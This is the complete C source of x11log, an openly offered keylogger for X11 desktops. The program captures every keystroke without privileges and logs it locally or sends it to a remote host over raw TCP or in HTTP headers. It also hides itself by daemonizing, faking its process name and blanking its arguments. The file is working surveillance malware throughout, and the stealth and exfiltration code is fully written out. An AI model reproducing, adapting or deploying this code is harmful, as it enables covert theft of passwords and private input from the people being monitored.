/* vim: set ts=4 sw=4: */
/* -- x11log.c
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
 * www.delta-xi.net, launchpad.net/x11log
 *
 * TODOs and Bugs: Please refer to the official project-page on Launchpad!
 *  -> http://launchpad.net/x11log
 * */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>      /* signal() */
#include <unistd.h>      /* getopt() */
#include <ctype.h>       /* toupper() */

#include <sys/types.h>   /* time_t */
#include <sys/stat.h>    /* umask() */
#include <time.h>        /* time(), localtime(), asctime() */
#include <sys/socket.h>  /* socket(), send() */
#include <netinet/in.h>  /* inet datatypes */
#include <netdb.h>
#include <errno.h>
#include <stdarg.h>      /* variable argument list for printf wrapper */

#include <X11/Xlib.h>
#include <X11/X.h>

#ifdef _HAVE_CURL
  #include <curl.h>
#endif //_HAVE_CURL

#include "x11log.h"



/* We only want to detect changed keyboard states, so we declare two keymap
 * arrays (each holding a X keymap vector), whose contents are swapped in each
 * iteration in order to recognize changes. Pointers just for readability. */
static char keymap[2][XKBD_WIDTH],
		*kbd = keymap[0],
		*tmp = keymap[1];

static XModifierKeymap *map;
static Display *dsp;
static int verbosity = 1;

/* flags set via signal handler */
static int flag_exit = 0;
static int flag_flush = 0;

/* Here we go. */
int main (int argc, char ** argv) {
	int i;
	struct tm *timestart;
	struct config_struct config;
	char* keystroke;

	timestart = initialize(argc, argv, &config);

	/* NULL defaults to what is given in DISPLAY environment variable. However,
	 * in some cases (e.g. within a VC) this variable is not set; so better go
	 * with :0.0, which is the correct default display in 99% of all cases. This
	 * also works via SSH connections, as long as getuid() user is running X. */
	dsp = XOpenDisplay( (config.display) ? config.display : X_DEFAULT_DISPLAY );
	if(!dsp)
		fatal("Cannot open display");

	XSynchronize (dsp, True);
	map = XGetModifierMapping(dsp);

	log(1, stderr, "\n\n--New Session at %s\n", asctime(timestart));

	/* we'll only try to find changed keys */
	for(XQueryKeymap(dsp, kbd);; usleep(DELAY)){
		//check if signal handler set global flags
		if(flag_exit)
			clean_exit(&config);
		if(!--flag_flush)
			fflush(config.logfd);

		SWAP(kbd, tmp, char*);
		XQueryKeymap(dsp, kbd);

		for( i = 0; i < XKBD_WIDTH * BITS_PER_BYTE; i++ )
			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
				keystroke = decodeKey(i, getbit(kbd, i), getMods(kbd));
				log( 1, config.logfd, "%s", keystroke);
				fflush(config.logfd);

				if(config.log_remote_inet)
					transmit_keystroke_inet(keystroke, &config);

				if(config.log_remote_http)
					transmit_keystroke_http(keystroke, &config, 
						config.log_remote_http_nodelay ? 1 : 0);
			}
	}
}

struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
	int c, i, j;
	time_t rawtime;

	/* connect signals to handler-functions */
	signal(SIGTERM, signal_handler);
	signal(SIGINT,  signal_handler);
	signal(SIGHUP,  signal_handler);

	/* set default values for cmdline options */
	config->display = X_DEFAULT_DISPLAY;
	config->logfile = NULL;
	config->logfd = stdout;
	config->silent = 0;
	config->log_remote_inet = 0;
#ifdef _HAVE_CURL
	config->log_remote_http = 0;
#endif
	config->process_fakename = NULL;
	config->remote_addr = NULL;
	config->host = NULL;
	config->port = 0;
	config->daemonize = 0;
	config->obfuscate = 0;
	config->log_remote_http_nodelay = 0;

	/* parse cmdline arguments */
	while((c = getopt(argc, argv, "O:s:f:H:h:?r:qdo")) != -1){
		switch(c) {
		  case 's':
			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
				break;

			config->display = smalloc(sizeof(char) * strlen(optarg) + 1);
			strncpy(config->display, optarg, strlen(optarg));
			break;
		  case 'f':
			config->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
			strncpy(config->logfile, optarg, strlen(optarg));
			break;
#ifdef _HAVE_CURL
		  case 'H':
			config->log_remote_http_nodelay = 1;
		  case 'h':
			config->host = smalloc(sizeof(char) * strlen(optarg) + 1);
			strcpy(config->host, optarg);
			config->log_remote_http = 1;
			break;
#endif
		  case 'r':
			config->remote_addr = optarg;
			config->log_remote_inet = 1;
			break;
		  case 'q':
			config->silent = 1;
			verbosity = 0;
			break;
		  case 'd':
			config->daemonize = 1;
			break;
		  case 'O':
			config->process_fakename = smalloc(sizeof(char) * strlen(optarg) +1);
			strcpy(config->process_fakename, optarg);
		  case 'o':
			config->obfuscate= 1;
			break;
		  case '?':
			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n");
			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
			log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
			log(0, stderr, " Available options:\n");
			log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
			log(0, stderr, "   -f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is\n");
			log(0, stderr, "                   appended, logfile created if it does not exist.\n");
			log(0, stderr, "   -r <HOST:PORT>  Log keystrokes to remote host. The other end needs a\n");
			log(0, stderr, "                   program listening on the specified TCP port (e.g. using\n");
			log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
#		   ifdef _HAVE_CURL
			log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
			log(0, stderr, "   -H <HOST>       like -h, but without buffering.\n");
#		   endif
			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
			log(0, stderr, "   -q              Be quiet (no output to console).\n");
			log(0, stderr, "   -o              Obfuscate process name in process table.\n");
			log(0, stderr, "   -O <NAME>       Rename process to given argument.\n");
			log(0, stderr, "   -?              Print usage.\n");

			exit(EXIT_FAILURE);
		  default:
			break;
		}
	}

	/* logical constraints */
	if(config->silent &&
	  !(config->log_remote_inet || config->log_remote_http || config->logfile))
		fatal("Argument -q requires either logging to file or remote host (-r|-h|-f)");
	if(config->daemonize &&
	  !(config->log_remote_inet || config->log_remote_http || config->logfile))
		fatal("Argument -d requires either logging to file or remote host (-r|-h|-f)");
	if(config->obfuscate && !config->daemonize)
		fatal("Argument -o requires daemonization (-d)");

	/* log to file if given, use stdout otherwise  */
	if(config->logfile != NULL){
		config->logfd = fopen(config->logfile, "a");
		if(!config->logfd) {
			log(1, stderr, "Error writing to %s, fallback to console.\n", argv[1]);
			config->logfd = stdout;
		}
	}

	/* remote logging argument validation */
	if((config->remote_addr != NULL)
		&& (strstr(config->remote_addr, ":") != NULL)
		&& (config->log_remote_inet)) {

		char* host_tmp = strtok(config->remote_addr, ":");
		config->host = smalloc(sizeof(char) * strlen(host_tmp) + 1);
		strncpy(config->host, host_tmp, strlen(host_tmp));

		config->port = atol( strtok(NULL, ":") );

		if(config->port < TCP_PORT_MIN || config->port > TCP_PORT_MAX)
			fatal("Invalid tcp port number");
	} else if (config->remote_addr != NULL) {
		fatal("Illegal argument for remote logging");
	}

	/* to daemonize or not to daemonize */
	if(config->daemonize)
		daemonize((config->obfuscate) ? argv[0] : NULL, config);

	/* cmdline arguments are always hidden */
	for(i = 1; i < argc; i++)
		for (j = 0; j < strlen(argv[i]); j++)
			argv[i][j] = ' ';

	/* just for logging */
	rawtime = time(NULL);
	return localtime(&rawtime);
}

char* decodeKey(int code, int down, int mod) {
	static char *str, keystroke_readable[MAX_KEYLEN + 1];
	int i = 0, remapChar = 0;
	KeySym sym;

	sym = XKeycodeToKeysym(dsp, code, (mod == SHIFT_DOWN) ? True : False);
	if(sym == NoSymbol)
		return "";

	str = XKeysymToString(sym);
	if(!str)
		return "";

	sprintf(keystroke_readable, "%s", str);

	/* shortenize (remap) char str if in mapping table */
	while (remap[i].src[0]) {
		if (strstr(keystroke_readable, remap[i].src)) {
			strcpy(keystroke_readable, remap[i].dst);
			remapChar = 1;
			break;
		}
		i++;
	}

	/* no remapping, but "long" keysym */
	if(keystroke_readable[1] && !remapChar) {
		(down)
			? sprintf(keystroke_readable, "%s%s%s", "[+", str, "]")
			: sprintf(keystroke_readable, "%s%s%s", "[-", str, "]");
		return keystroke_readable;
	}

	if(mod == CONTROL_DOWN) 
		sprintf(keystroke_readable, "%c%c%c", '^', keystroke_readable[0], '\0');

	if(mod == LOCK_DOWN) 
		keystroke_readable[0] = toupper(keystroke_readable[0]);

	return keystroke_readable;
}

int getMods(char *kbd) {
	int i;
	KeyCode kc;

	for (i = 0; i < map->max_keypermod; i++) {
		kc = map->modifiermap[ControlMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return CONTROL_DOWN;

		kc = map->modifiermap[ShiftMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return SHIFT_DOWN;

		kc = map->modifiermap[LockMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return LOCK_DOWN;
	}

	return 0;
}

int getbit(char *kbd, int idx) {
	return kbd[idx/8] & (1<<(idx%8));
}


void signal_handler(int sig) {
	switch(sig) {
	  case(SIGINT):
	  case(SIGTERM):
		log(1, stderr, "\n -- x11log terminated.\n");
		flag_exit = 1;
		return;
	  case(SIGHUP):
		log(1, stderr, "\n -- SIGHUP: flushing log.\n");
		flag_flush = 1;
	  	return; 
	}
}

void clean_exit(struct config_struct* cfg){
	if(cfg->logfd != stdout)
		fclose(cfg->logfd);
	
	/* Transmit very last keystroke-buffer chunk if HTTP logging is enabled */
	if (cfg->log_remote_http)
		transmit_keystroke_http( "", cfg, 1 );
	
	/* Free dynamically allocated memory */
	if( strcmp(cfg->display, X_DEFAULT_DISPLAY) != 0)
		free( cfg->display );
	if( cfg->host != NULL )
		free( cfg->host );
	if( cfg->logfile != NULL )
		free( cfg->logfile );

	exit(EXIT_SUCCESS);
}


void fatal(const char * msg){
	if(msg != NULL)
		log(0, stderr, "Fatal: %s.\n", msg);
	exit(EXIT_FAILURE);
}

int transmit_keystroke_inet(char* key, struct config_struct *opts){
	int sock, bytes_sent;
	struct hostent *host;
	struct sockaddr_in server_addr;

	if((host = gethostbyname( opts->host )) == NULL)
		return ERR_DNS;

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return ERR_SOCKET;

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons( opts->port );
	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
	bzero(&(server_addr.sin_zero),8);

	if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1)
		return ERR_CONNECT;

	bytes_sent = send(sock, key, strlen(key), 0);
	close(sock);

	return bytes_sent;
}


#ifdef _HAVE_CURL
int transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow){
	CURL* curl;
	char *http_header_field = HTTP_HEADER_FIELD;
	char *http_header;
	static char keystroke_buffer[KEYSTROKE_BUFFER_SIZE + 1]; //+null byte

	if( (strlen(keystroke_buffer) + strlen(key) <= (KEYSTROKE_BUFFER_SIZE))
			&& !sendnow ) {
		strcat(keystroke_buffer, key);
		return 2;
	}

	log(2, cfg->logfd, "HTTP buffer queue full, sending to webserver.");

	curl = curl_easy_init();
	if(!curl)
		return 0;

	/* create http header-line with keystroke in it */
	struct curl_slist *headers = NULL;
	http_header = alloca(sizeof(char) *
		(strlen(http_header_field) + KEYSTROKE_BUFFER_SIZE +1));

	sprintf(http_header, "%s%s", http_header_field, keystroke_buffer);
	headers = curl_slist_append(headers, http_header);

	/* build http request and send */
	curl_easy_setopt(curl, CURLOPT_URL, cfg->host );
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_blackhole);
	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
	if (curl_easy_perform(curl) != 0)
		return 0;

	curl_easy_cleanup(curl);

	keystroke_buffer[0] = 0;
	strcat(keystroke_buffer, key);
	return 1;
}
#endif //_HAVE_CURL

void log(int level, FILE* stream, const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	
	if(verbosity >= level || (stream != stdout && stream != stderr))
		vfprintf(stream, fmt, args);

	va_end(args);
}


int daemonize(char* child_process_name, struct config_struct* cfg){
	pid_t pid, sid;
	
	pid  = fork();
	if(pid < 0) 
		fatal("Error forking process");

	if(pid > 0)
		exit(EXIT_SUCCESS);
	
	umask(0);

	sid = setsid();
	if(sid < 0)
		fatal("Error setting SID for child process");

	if(chdir("/") < 0)
		fatal("Error setting work directory to /");

	/* process name obfuscation */
	if(child_process_name != NULL) {
		int process_name_len = strlen(child_process_name);
		strncpy(child_process_name, (cfg->process_fakename == NULL)
			? PROCESS_FAKE_NAME : cfg->process_fakename, process_name_len);
	}

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	return pid;
}

void* smalloc(size_t size) {
	void* ptr;
	
	if((ptr = malloc(size)) == NULL)
		fatal("Unable to allocate memory");

	return ptr;
}

#ifdef _HAVE_CURL
size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none) {
	return size * nmemb;
}
#endif //_HAVE_CURL

